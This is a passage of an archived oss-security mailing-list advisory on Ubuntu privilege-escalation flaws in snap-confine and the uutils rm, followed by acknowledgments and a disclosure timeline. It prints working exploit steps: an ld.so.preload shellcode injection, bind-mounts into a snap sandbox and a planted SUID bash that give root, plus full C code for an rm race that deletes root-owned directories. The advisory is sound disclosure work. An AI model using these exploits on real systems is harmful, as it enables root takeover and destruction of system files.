+&gt;   create ./librootshell.so (/tmp/librootshell.so inside the sandbox), a
+&gt;   simple shellcode that calls setreuid(0) and execve(/tmp/sh), we copy
+&gt;   /usr/bin/busybox to ./sh (/tmp/sh inside the sandbox), and we add the
+&gt;   following to ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab,
+&gt;   which will bind-mount our copy of /etc inside snap-store's sandbox:
+&gt;
+&gt;   /tmp/.snap/etc /etc none rbind,rw 0 0
+&gt;
+&gt; - we also add the following line to
+&gt;   ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab (and replace
+&gt;   our own ./.snap/var/lib with the original ./.snap/var/lib.exchange),
+&gt;   which will bind-mount the original, root-owned /var/lib/snapd inside
+&gt;   snap-store's sandbox (otherwise snap-confine dies because it detects
+&gt;   that /var/lib/snapd does not belong to root -- it belongs to us since
+&gt;   we won the race condition against the "mimic" creation of /var/lib):
+&gt;
+&gt;   /tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ cp -a /etc ./.snap
+&gt; ...
+&gt;
+&gt; outside$ echo /tmp/librootshell.so &gt; ./.snap/etc/ld.so.preload
+&gt;
+&gt; outside$ cp ~/librootshell.so ./
+&gt;
+&gt; outside$ cp /usr/bin/busybox ./sh
+&gt;
+&gt; outside$ echo '/tmp/.snap/etc /etc none rbind,rw 0 0' &gt; ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab
+&gt;
+&gt; outside$ echo '/tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0' &gt;&gt; ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab
+&gt;
+&gt; outside$ mv ./.snap/var/lib ./.snap/var/lib.exchange2
+&gt;
+&gt; outside$ mv ./.snap/var/lib.exchange ./.snap/var/lib
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Fourth, we obtain a root shell inside snap-store's sandbox, by executing
+&gt; snap-confine with one of the SUID-root binaries in /tmp/.snap (such as
+&gt; /tmp/.snap/var/lib/snapd/hostfs/snap/core22/current/usr/bin/su), which
+&gt; is dynamically linked and therefore preloads our /tmp/librootshell.so
+&gt; and executes our shellcode (and hence a busybox shell) as root.
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ env -i SNAP_INSTANCE_NAME=snap-store /usr/lib/snapd/snap-confine --base core22 snap.snap-store.hook.configure /tmp/.snap/var/lib/snapd/hostfs/snap/core22/current/usr/bin/su
+&gt; ...
+&gt; BusyBox v1.37.0 (Ubuntu 1:1.37.0-4ubuntu1) built-in shell (ash)
+&gt; ...
+&gt;
+&gt; inside# id
+&gt; uid=0(root) gid=1001(jane) groups=100(users),1001(jane)
+&gt; ^^^^^^^^^^^
+&gt;
+&gt; inside# cat /etc/shadow
+&gt; cat: can't open '/etc/shadow': No such file or directory
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Fifth, because this root shell is still inside snap-store's sandbox,
+&gt; confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
+&gt; to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
+&gt; allowed by the AppArmor profile and the seccomp filter), and execute
+&gt; this SUID-root shell from outside snap-store's sandbox, thereby finally
+&gt; gaining full root privileges.
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; inside# cp /bin/bash /var/snap/snap-store/common/
+&gt;
+&gt; inside# chmod 04755 /var/snap/snap-store/common/bash
+&gt;
+&gt; inside# exit
+&gt;
+&gt; outside$ /var/snap/snap-store/common/bash -p
+&gt;
+&gt; outside# id
+&gt; uid=1001(jane) gid=1001(jane) euid=0(root) groups=1001(jane),100(users)
+&gt;                               ^^^^^^^^^^^^
+&gt;
+&gt; outside# cat /etc/shadow
+&gt; root:*:20368:0:99999:7:::
+&gt; daemon:*:20368:0:99999:7:::
+&gt; ...
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt;
+&gt; ========================================================================
+&gt; A quick note on the uutils coreutils (the rust-coreutils)
+&gt; ========================================================================
+&gt;
+&gt; In August 2025, before the release of Ubuntu 25.10, the Ubuntu Security
+&gt; Team proactively contacted us and kindly asked us if we were interested
+&gt; in reviewing the security of the uutils coreutils (a Rust rewrite of the
+&gt; standard GNU coreutils -- ls, cp, rm, cat, sort, sleep, etc), which are
+&gt; since then installed by default in Ubuntu 25.10.
+&gt;
+&gt; We were deeply interested, and honored, but unfortunately at the time we
+&gt; were already working full-time on another project; so we told the Ubuntu
+&gt; Security Team that we would not be able to conduct an official security
+&gt; review, but that we would try to work on it anyway during our free time.
+&gt;
+&gt; We started by carefully reading the following report, which already
+&gt; contained extremely valuable information; in particular, the mention of
+&gt; "unsafe, racy, tree walking algorithms" caught our attention:
+&gt;
+&gt;   <a href="https://bugs.launchpad.net/ubuntu/+source/rust-coreutils/+bug/2111815" rel="nofollow">https://bugs.launchpad.net/ubuntu/+source/rust-coreutils/+bug/2111815</a>
+&gt;
+&gt; From our work on apport (CVE-2025-5054), we then remembered that the
+&gt; shell script /etc/cron.daily/apport is installed by default on Ubuntu,
+&gt; is executed as root once per day, and can recursively delete entire
+&gt; sub-directories of /var/crash, which is world-writable like /tmp:
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; $ cat /etc/cron.daily/apport
+&gt; ...
+&gt; find /var/crash/. ! -name . -prune -type d -regextype posix-extended -regex '.*/[0-9]{12}$' \( -mtime +7 \) -exec rm -Rf -- '{}' \;
+&gt;
+&gt; $ stat /var/crash
+&gt; ...
+&gt; Access: (3777/drwxrwsrwt)  Uid: (    0/    root)   Gid: (    0/    root)
+&gt; ...
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Since rm is one of the uutils coreutils, we decided to create a
+&gt; directory /var/crash/base/parent/target (as an unprivileged attacker)
+&gt; and to analyze the strace of an "rm -Rf /var/crash/base" command (as
+&gt; root), and we quickly discovered that rm was vulnerable to a trivial
+&gt; race condition:
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt;   1 execve("/usr/bin/rm", ["rm", "-Rf", "/var/crash/base"], ...) = 0
+&gt; ...
+&gt; 147 openat(AT_FDCWD, "/var/crash/base", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
+&gt; ...
+&gt; 152 openat(AT_FDCWD, "/var/crash/base/parent", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
+&gt; ...
+&gt; 158 openat(AT_FDCWD, "/var/crash/base/parent/target", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 5
+&gt; ...
+&gt; 163 rmdir("/var/crash/base/parent/target")  = 0
+&gt; ...
+&gt; 167 rmdir("/var/crash/base/parent")         = 0
+&gt; ...
+&gt; 171 rmdir("/var/crash/base")                = 0
+&gt; ...
+&gt; 174 exit_group(0)                           = ?
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; - if, after rm calls openat() on /var/crash/base/parent (at line 152),
+&gt;   but before rm calls openat() on /var/crash/base/parent/target (at line
+&gt;   158), if the attacker replaces /var/crash/base/parent with a symlink
+&gt;   (which will be followed by rm) to another part of the filesystem (for
+&gt;   example, to /etc), then this attacker can delete arbitrary parts of
+&gt;   the filesystem, as root (the shell script /etc/cron.daily/apport is
+&gt;   executed as root);
+&gt;
+&gt; - for example, if the attacker replaces "parent" with a symlink to /etc,
+&gt;   and if "target" is "ppp", then rm will recursively delete the entire
+&gt;   /etc/ppp directory.
+&gt;
+&gt; We immediately reported this vulnerability to Ubuntu, who, as a
+&gt; temporary mitigation in Ubuntu 25.10, replaced the default rm with a
+&gt; symlink to the standard GNU coreutils' rm (i.e., in Ubuntu 25.10, rm is
+&gt; a symlink to /usr/bin/gnurm, not a symlink to the uutils coreutils'
+&gt; /usr/lib/cargo/bin/coreutils/rm).
+&gt;
+&gt; To the best of our knowledge, this vulnerability in the uutils
+&gt; coreutils' rm was later fixed upstream (by calling openat() relatively
+&gt; to each component of a path, instead of calling openat() on absolute
+&gt; paths and resolving each path component multiple times), by commits:
+&gt;
+&gt;   <a href="https://github.com/uutils/coreutils/commit/1183529cd2deafb38bed3b6bf212357b68eefa41" rel="nofollow">https://github.com/uutils/coreutils/commit/1183529cd2deafb38bed3b6bf212357b68eefa41</a>
+&gt;   <a href="https://github.com/uutils/coreutils/commit/e773c95c4e62424db17563242c35e488a6d1ae9b" rel="nofollow">https://github.com/uutils/coreutils/commit/e773c95c4e62424db17563242c35e488a6d1ae9b</a>
+&gt;   <a href="https://github.com/uutils/coreutils/commit/45e6cbd109a0a33d82e90c985813ea83d4009714" rel="nofollow">https://github.com/uutils/coreutils/commit/45e6cbd109a0a33d82e90c985813ea83d4009714</a>
+&gt;
+&gt; However, at the time of writing this advisory, the uutils coreutils'
+&gt; /usr/lib/cargo/bin/coreutils/rm that is shipped with Ubuntu 25.10 is
+&gt; still vulnerable (but unused, since the default is the GNU coreutils'
+&gt; rm); this allows us to test what would have happened if the vulnerable
+&gt; rm had been shipped as the default in Ubuntu 25.10. For example, below
+&gt; we run our proof of concept as an unprivileged user, and root executes
+&gt; the rm command that would have been executed by /etc/cron.daily/apport,
+&gt; thereby accidentally deleting the entire /etc/ppp directory:
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; $ cat /etc/os-release
+&gt; PRETTY_NAME="Ubuntu 25.10"
+&gt; ...
+&gt;
+&gt; $ id
+&gt; uid=1001(jane) gid=1001(jane) groups=1001(jane),100(users)
+&gt;
+&gt; $ cat &gt; uutils_rm.c &lt;&lt; "EOF"
+&gt; #define _GNU_SOURCE
+&gt; #include &lt;sys/inotify.h&gt;
+&gt; #include &lt;sys/param.h&gt;
+&gt; #include &lt;sys/stat.h&gt;
+&gt; #include &lt;sys/types.h&gt;
+&gt; #include &lt;dirent.h&gt;
+&gt; #include &lt;fcntl.h&gt;
+&gt; #include &lt;stdio.h&gt;
+&gt; #include &lt;stdlib.h&gt;
+&gt; #include &lt;string.h&gt;
+&gt; #include &lt;unistd.h&gt;
+&gt; #include &lt;utime.h&gt;
+&gt;
+&gt; #define die() do { \
+&gt;     fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
+&gt;     exit(EXIT_FAILURE); \
+&gt; } while (0)
+&gt;
+&gt; int
+&gt; main(const int argc, const char * const argv[])
+&gt; {
+&gt;     if (argc &lt; 3) die();
+&gt;     const char * const writable_dir = argv[1];
+&gt;     if (*writable_dir != '/') die();
+&gt;
+&gt;     const char * const parent_dir = strdup(argv[2]);
+&gt;     if (!parent_dir) die();
+&gt;     char * const last_slash = strrchr(parent_dir, '/');
+&gt;     if (!last_slash) die();
+&gt;
+&gt;     const char * const target_dir = strdup(last_slash + 1);
+&gt;     if (!target_dir) die();
+&gt;
+&gt;     last_slash[1] = '\0';
+&gt;     if (*parent_dir != '/') die();
+&gt;     if (!*target_dir) die();
+&gt;
+&gt;     unsigned long n_pre_dirs = 32;
+&gt;     if (argc &gt; 3) {
+&gt;         if (argc != 4) die();
+&gt;         n_pre_dirs = strtoul(argv[3], NULL, 0);
+&gt;     }
+&gt;     if (n_pre_dirs &lt;= 0) die();
+&gt;     if (n_pre_dirs &gt; (1u&lt;&lt;20)) die();
+&gt;
+&gt;     if (chdir(writable_dir)) die();
+&gt;     char base_dir[] = "XXXXXX";
+&gt;     if (!mkdtemp(base_dir)) die();
+&gt;     if (chdir(base_dir)) die();
+&gt;
+&gt;     if (mkdir("parent", 0700)) die();
+&gt;     if (chdir("parent")) die();
+&gt;     if (mkdir(target_dir, 0700)) die();
+&gt;
+&gt;     const char * first_dir = NULL;
+&gt;     for (;;) {
+&gt;         char try[] = "XXXXXX";
+&gt;         if (!mkdtemp(try)) die();
+&gt;
+&gt;         unsigned long n = 0;
+&gt;         DIR * const dirp = opendir(".");
+&gt;         if (!dirp) die();
+&gt;         for (;;) {
+&gt;             const struct dirent * const entp = readdir(dirp);
+&gt;             if (!entp) die();
+&gt;             if (*entp-&gt;d_name == '.') continue;
+&gt;             if (!strcmp(entp-&gt;d_name, target_dir)) break;
+&gt;             n++;
+&gt;             if (!first_dir) {
+&gt;                 first_dir = strdup(entp-&gt;d_name);
+&gt;                 if (!first_dir) die();
+&gt;             }
+&gt;         }
+&gt;         if (closedir(dirp)) die();
+&gt;         if (n &gt;= n_pre_dirs) break;
+&gt;     }
+&gt;     if (!first_dir) die();
+&gt;
+&gt;     if (chdir(first_dir)) die();
+&gt;     unsigned long i;
+&gt;     for (i = 0; i &lt; n_pre_dirs; i++) {
+&gt;         char num[256];
+&gt;         snprintf(num, sizeof(num), "%lu", i);
+&gt;         if (mkdir(num, 0700)) die();
+&gt;     }
+&gt;     const int in_fd = inotify_init();
+&gt;     if (in_fd &lt;= -1) die();
+&gt;     if (inotify_add_watch(in_fd, ".", IN_ATTRIB) &lt;= -1) die();
+&gt;
+&gt;     if (chdir("..")) die();
+&gt;     if (chdir("..")) die();
+&gt;     if (symlink(parent_dir, "../switch")) die();
+&gt;     static const struct utimbuf epoch = { 1, 1 };
+&gt;     if (utime(".", &amp;epoch)) die();
+&gt;
+&gt;     fprintf(stderr, "ready\n");
+&gt;     static char in_buf[sizeof(struct inotify_event) + NAME_MAX + 1];
+&gt;     if (read(in_fd, in_buf, sizeof(in_buf)) &lt; (ssize_t)sizeof(struct inotify_event)) die();
+&gt;     if (renameat2(AT_FDCWD, "parent", AT_FDCWD, "../switch", RENAME_EXCHANGE)) die();
+&gt;     die();
+&gt; }
+&gt; EOF
+&gt;
+&gt; $ gcc -s -o uutils_rm uutils_rm.c
+&gt;
+&gt; $ stat /etc/ppp
+&gt; ...
+&gt; Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+&gt; ...
+&gt;
+&gt; $ ./uutils_rm /var/crash /etc/ppp
+&gt; ready
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Then, as root (to simulate the /etc/cron.daily/apport shell script):
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; # id
+&gt; uid=0(root) gid=0(root) groups=0(root)
+&gt;
+&gt; # dpkg -S /usr/lib/cargo/bin/coreutils/rm
+&gt; rust-coreutils: /usr/lib/cargo/bin/coreutils/rm
+&gt;
+&gt; # dpkg -l rust-coreutils
+&gt; ...
+&gt; ii  rust-coreutils 0.2.2-0ubuntu2.1 amd64        Universal coreutils utils, written in Rust
+&gt;
+&gt; # find /var/crash/. ! -name . -prune -type d \( -mtime +7 \) -exec /usr/lib/cargo/bin/coreutils/rm -Rf -- '{}' \;
+&gt; ...
+&gt;
+&gt; # stat /etc/ppp
+&gt; stat: cannot stat '/etc/ppp': No such file or directory (os error 2)
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Back in September 2025, we reported this vulnerability to Ubuntu as a
+&gt; denial of service (the ability to delete arbitrary files and directories
+&gt; as root), but after writing this advisory it became perfectly clear that
+&gt; this vulnerability was actually powerful enough to be transformed into a
+&gt; Local Privilege Escalation (LPE) to full root (for example by deleting a
+&gt; /tmp/snap-private-tmp/$SNAP/tmp/.snap directory). Fortunately, this LPE
+&gt; was avoided thanks to the Ubuntu Security Team, who proactively reached
+&gt; out to us and mitigated it before the release of Ubuntu 25.10.
+&gt;
+&gt;
+&gt; ========================================================================
+&gt; Acknowledgments
+&gt; ========================================================================
+&gt;
+&gt; We thank everyone at Canonical who worked on this release (Seth Arnold,
+&gt; Zygmunt Krynicki, Nick Dyer, Eduardo Barretto, and Luci Stanescu, in
+&gt; particular) and on the uutils coreutils with us (Octavio Galland, Ravi
+&gt; Kant Sharma, Seth Arnold, and Julian Andres Klode, in particular). We
+&gt; also thank the members of the linux-distros mailing list (Alexander
+&gt; Peslyak in particular).
+&gt;
+&gt; Finally, we dedicate this advisory to Felix Lindner:
+&gt;
+&gt;   <a href="https://phenoelit.de/fx.html" rel="nofollow">https://phenoelit.de/fx.html</a>
+&gt;   <a href="https://defcon.social/&#64;thedarktangent/116157827849844661" rel="nofollow">https://defcon.social/&#64;thedarktangent/116157827849844661</a>
+&gt;
+&gt;
+&gt; ========================================================================
+&gt; Timeline
+&gt; ========================================================================
+&gt;
+&gt; 2025-12-15: We sent a draft of our advisory and two proofs of concept
+&gt; (firefox_24.04.c and snap-store_25.10.c) to the Ubuntu Security Team.
+&gt;
+&gt; 2026-03-12: The Ubuntu Security Team sent a patch, and we sent a draft
+&gt; of our advisory, to the linux-distros mailing list.
+&gt;
+&gt; 2026-03-17: Coordinated Release Date (14:00 UTC).
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
